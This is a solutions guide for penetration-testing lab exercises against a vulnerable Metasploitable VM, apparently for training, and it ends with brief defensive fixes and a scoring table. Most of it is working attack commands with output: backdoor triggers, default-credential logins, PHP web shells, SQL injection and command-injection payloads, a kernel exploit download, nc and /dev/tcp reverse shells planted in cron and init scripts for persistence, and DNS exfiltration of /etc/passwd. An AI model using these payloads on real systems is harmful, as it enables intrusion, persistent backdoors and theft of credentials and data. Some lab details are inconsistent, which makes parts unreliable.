# Solutions Guide
## Detailed Answers for Metasploitable3 Challenges

**⚠️ IMPORTANT:** Try to solve challenges yourself first! Only use this guide after attempting solutions.

---

## EXERCISE 1: Comprehensive Reconnaissance

### Complete Solution:

```bash
# 1. Network discovery
nmap -sn 172.23.0.0/24
# Output: 172.23.0.2 (kali_attacker), 172.23.0.3 (victim)

# 2. Full port scan
nmap -p- -T4 172.23.0.3
# Open ports: 21, 22, 23, 25, 53, 80, 111, 139, 445, 512, 513, 514, 1099, 1524, 2049, 2121, 3306, 5432, 5900, 6000, 6667, 8009, 8180

# 3. Service detection
nmap -sV -sC -O 172.23.0.3 -oA full-scan
```

**Key Findings:**
- **FTP (21):** vsftpd 2.3.4 - Known backdoor vulnerability
- **SSH (22):** OpenSSH 4.7p1 Debian 8ubuntu1 - Weak encryption
- **HTTP (80):** Apache httpd 2.2.8 - Multiple vulnerabilities
- **SMB (139/445):** Samba 3.0.20-Debian - Multiple vulnerabilities
- **MySQL (3306):** MySQL 5.0.51a-3ubuntu5 - Weak credentials

**Web Enumeration:**
```bash
# Directory brute force
gobuster dir -u http://172.23.0.3 -w /usr/share/wordlists/dirb/common.txt -o web-dirs.txt
# Found: /phpmyadmin/, /test/, /doc/, /icons/, /mutillidae/, /dvwa/

# Technology detection
whatweb http://172.23.0.3
# Apache/2.2.8, PHP/5.2.4, MySQL, JQuery
```

**SMB Enumeration:**
```bash
enum4linux -a 172.23.0.3
# Shares: tmp, opt, IPC$, ADMIN$
# Users: root, msfadmin, user, postgres, service
```

---

## EXERCISE 2: FTP Exploitation

### Solution 1: Anonymous Access

```bash
# Connect to FTP
ftp 172.23.0.3
# Username: anonymous
# Password: test@test.com

# Explore
ls -la
# Contains: /var/www/ directory accessible

# Upload web shell
put shell.php
# File uploaded to /var/www/shell.php

# Test execution
curl "http://172.23.0.3/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Solution 2: vsftpd 2.3.4 Backdoor

```bash
# Trigger backdoor
telnet 172.23.0.3 21
USER hello:)
PASS world

# Backdoor opens on port 6200
telnet 172.23.0.3 6200
# You now have root shell!
whoami
# root
```

**Explanation:** The `:)` in username triggers the backdoor. After sending this, a root shell opens on port 6200.

---

## EXERCISE 3: SSH Compromise

### Solution: Default Credentials

```bash
# Try default credentials
ssh msfadmin@172.23.0.3
# Password: msfadmin
# Success!

# Post-compromise enumeration
id
# uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)

sudo -l
# User msfadmin may run the following commands on this host:
#     (root) NOPASSWD: /bin/su
```

**Privilege Escalation Path:**
```bash
# msfadmin can run su without password
sudo su
# Now root!
whoami
# root
```

---

## EXERCISE 4: Database Exploitation

### Solution: MySQL Default Credentials

```bash
# Connect to MySQL
mysql -h 172.23.0.3 -u root
# No password required

# Enumerate databases
SHOW DATABASES;
# Information_schema, dvwa, metasploit, mysql, tikiwiki

# Access DVWA database
USE dvwa;
SHOW TABLES;
# Tables: guestbook, users

# Extract credentials
SELECT * FROM users;
# admin:password, gordonb:abc123, 1337:charley, pablo:letmein, smithy:password

# Check for file privileges
SELECT File_priv FROM mysql.user WHERE User='root';
# Y - File privileges enabled

# Write web shell
SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE '/var/www/mysql-shell.php';
```

**Alternative: MySQL UDF Exploitation**
```bash
# Check for plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
# /usr/lib/mysql/plugin/

# Upload shared library (if you have file upload)
# Then create function:
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/test.txt');
```

---

## EXERCISE 5: Web Application Attacks

### Solution 1: DVWA SQL Injection

```bash
# Set security to low first
# Login to DVWA: admin/password

# Manual SQLi
http://172.23.0.3/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- &Submit=Submit

# Using sqlmap
sqlmap -u "http://172.23.0.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=[session]" \
       --batch \
       --dbs
# Databases: dvwa, information_schema, mysql, tikiwiki

# Dump users table
sqlmap -u "http://172.23.0.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=[session]" \
       -D dvwa -T users --dump
```

### Solution 2: Mutillidae XSS

```bash
# Navigate to: http://172.23.0.3/mutillidae/
# Login: admin/password

# Go to "Add to Your Blog"
# Enter payload:
<script>alert(document.cookie)</script>

# Stored XSS - affects all users viewing blog
```

### Solution 3: File Upload Bypass

```bash
# In DVWA File Upload (security=low)
# Create file: shell.jpg.php
<?php system($_GET['cmd']); ?>

# Upload file
# Access: http://172.23.0.3/dvwa/hackable/uploads/shell.jpg.php?cmd=id
```

### Solution 4: Command Injection

```bash
# DVWA Command Injection (security=low)
http://172.23.0.3/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd

# Multiple commands
127.0.0.1;id;whoami;uname -a
```

---

## EXERCISE 6: Privilege Escalation

### Solution 1: Kernel Exploit (Dirty Cow)

```bash
# Check kernel version
uname -a
# Linux victim 2.6.24-16-server

# Download Dirty Cow exploit
wget https://www.exploit-db.com/download/40839 -O dirty.c

# Compile
gcc -pthread dirty.c -o dirty -lcrypt

# Run
./dirty
# Enter new password: dirty

# Switch to root
su root
# Password: dirty
```

### Solution 2: SUID Binary Exploitation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# /bin/su, /bin/ping, /bin/umount, /bin/mount, /bin/ping6, /usr/bin/chfn, /usr/bin/chsh, /usr/bin/gpasswd, /usr/bin/passwd, /usr/bin/newgrp, /usr/lib/pt_chown, /usr/lib/eject/dmcrypt-get-device, /usr/lib/openssh/ssh-keysign, /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper, /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

# Check for vulnerable SUID
# nmap has interactive mode with SUID
nmap --interactive
nmap> !sh
# Root shell!
```

### Solution 3: Cron Job Exploitation

```bash
# Check cron jobs
ls -la /etc/cron*
cat /etc/crontab

# If you find a writable cron script:
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your_ip] 4444 >/tmp/f" > /etc/cron.daily/backdoor.sh
chmod +x /etc/cron.daily/backdoor.sh
# Wait for cron to execute
```

### Solution 4: Sudo Misconfiguration

```bash
# Check sudo permissions
sudo -l
# If you can run any command as root:
sudo /bin/bash

# If specific commands allowed:
# Check GTFO bins: https://gtfobins.github.io/
sudo find / -exec /bin/bash \;
sudo perl -e 'exec "/bin/bash";'
sudo python -c 'import os; os.system("/bin/bash")'
```

---

## EXERCISE 7: Advanced Techniques

### Solution: Lateral Movement via SSH Keys

```bash
# After gaining root on victim
# Generate SSH key on victim
ssh-keygen -t rsa -b 2048
# Save to /root/.ssh/id_rsa

# Copy public key to Kali authorized_keys
echo "[public_key]" >> /root/.ssh/authorized_keys

# From Kali, SSH to victim without password
ssh -i /root/.ssh/id_rsa root@172.23.0.3
```

### Solution: Persistence via Backdoor

```bash
# 1. Create reverse shell backdoor
echo '#!/bin/bash' > /etc/init.d/backdoor
echo 'bash -i >& /dev/tcp/[your_ip]/4444 0>&1 &' >> /etc/init.d/backdoor
chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults

# 2. Add to crontab
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/[your_ip]/4445 0>&1") | crontab -

# 3. Add SSH authorized key
mkdir -p /root/.ssh
echo "[your_public_key]" >> /root/.ssh/authorized_keys
```

### Solution: Data Exfiltration

```bash
# 1. Find sensitive data
find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" -o -name "*.xls" 2>/dev/null
find / -type f -exec grep -l "password\|secret\|key\|credential" {} \; 2>/dev/null

# 2. Compress data
tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow /var/www/

# 3. Exfiltrate via HTTP
python -m SimpleHTTPServer 8000 &
# Then download from your machine

# 4. Exfiltrate via DNS (covert)
# Encode data in base64
cat /etc/passwd | base64 | tr -d '\n'
# Send via DNS queries
for chunk in $(cat /etc/passwd | base64 | fold -w 32); do
    dig $chunk.example.com
done
```

---

## 🛡️ DEFENSIVE COUNTERMEASURES

### For Each Vulnerability:

1. **FTP Backdoor:**
   ```bash
   # Update vsftpd
   apt-get update && apt-get upgrade vsftpd
   
   # Or disable FTP entirely
   service vsftpd stop
   update-rc.d vsftpd disable
   ```

2. **Default Credentials:**
   ```bash
   # Change all default passwords
   passwd root
   passwd msfadmin
   
   # Disable root SSH login
   echo "PermitRootLogin no" >> /etc/ssh/sshd_config
   service ssh restart
   ```

3. **MySQL Security:**
   ```sql
   -- Set root password
   SET PASSWORD FOR 'root'@'localhost' = PASSWORD('StrongPassword123!');
   
   -- Remove anonymous users
   DELETE FROM mysql.user WHERE User='';
   
   -- Remove remote root access
   DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
   
   FLUSH PRIVILEGES;
   ```

4. **Web Application Security:**
   ```bash
   # Update all web apps
   # Configure proper file permissions
   chown -R root:root /var/www/
   chmod -R 755 /var/www/
   
   # Install mod_security
   apt-get install libapache2-mod-security2
   a2enmod security2
   ```

5. **Kernel Security:**
   ```bash
   # Update kernel
   apt-get update && apt-get dist-upgrade
   
   # Reboot to apply updates
   reboot
   ```

---

## 📊 METRICS AND SCORING

### Scoring Your Performance:

| Task | Points | Your Score |
|------|--------|------------|
| Found all open ports | 10 | |
| Identified service versions | 10 | |
| Exploited FTP | 15 | |
| Gained SSH access | 15 | |
| Compromised MySQL | 10 | |
| Executed web attacks | 15 | |
| Achieved root access | 15 | |
| Created professional report | 10 | |
| **Total** | **100** | |

### Performance Levels:
- **90-100:** Expert - Ready for professional engagements
- **80-89:** Advanced - Strong practical skills
- **70-79:** Intermediate - Good understanding
- **60-69:** Beginner - Needs more practice
- **Below 60:** Novice - Review fundamentals

---

## 🎯 FINAL TIPS

1. **Document Everything:** Take screenshots, save command output
2. **Try Multiple Methods:** Don't rely on single exploitation path
3. **Understand Defenses:** Learn how to prevent each attack
4. **Practice Regularly:** Skills degrade without practice
5. **Stay Ethical:** Only test systems you own or have permission to test

### Next Challenge:
Try to complete all exercises within 4 hours to simulate exam conditions.

### Certification Path:
- Complete all exercises: **Beginner Level**
- Complete within time limit: **Intermediate Level**  
- Discover additional vulnerabilities: **Advanced Level**
- Write comprehensive report: **Expert Level**

---

*Remember: The goal is not just to hack, but to understand security deeply.* 🔐